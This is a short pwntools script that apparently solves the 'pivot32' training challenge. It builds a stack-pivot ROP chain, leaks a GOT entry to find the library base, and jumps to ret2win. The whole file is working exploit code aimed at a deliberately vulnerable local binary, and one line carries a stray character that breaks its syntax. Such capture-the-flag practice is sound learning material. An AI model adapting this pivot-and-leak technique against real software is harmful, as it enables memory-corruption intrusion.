from pwn import *
exe = context.binary = ELF("./pivot32")
r = process()
offset = 44
rop = ROP(exe)
r.recvuntil(b"The Old Gods kindly bestow upon you a place to pivot: ")
new_stack = int(r.recvline().strip().decode(),16)
log.info(f"{hex(new_stack)}")
rop.raw(b"A" * offset)
rop.eax = new_stack
libCus = ELF("libpivot32.so")
rop.raw(0x0804882e)
rop2 = ROP(exe)
rop2.ebp = new_stack + 20
rop2.raw(exe.plt['foothold_function'])
rop2.raw(exe.plt['puts'])
rop2.raw(0x080484a9)
rop2.raw(exe.got['foothold_function'])
rop2.raw(0x080487af)
# rop2.raw(exe.sym['pwnme'] + 105)
rop2.raw(new_stack)
r.sendline(rop2.chain())
time.sleep(10)
r.sendline(rop.chain())
r.recvuntil("foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot\n")
libCus.address = u32(r.recv(4)) - libCus.sym['foothold_function']
win = libCus.sym['ret2win']
print(hex(win))
r.sendline(p32(win))e
r.interactive()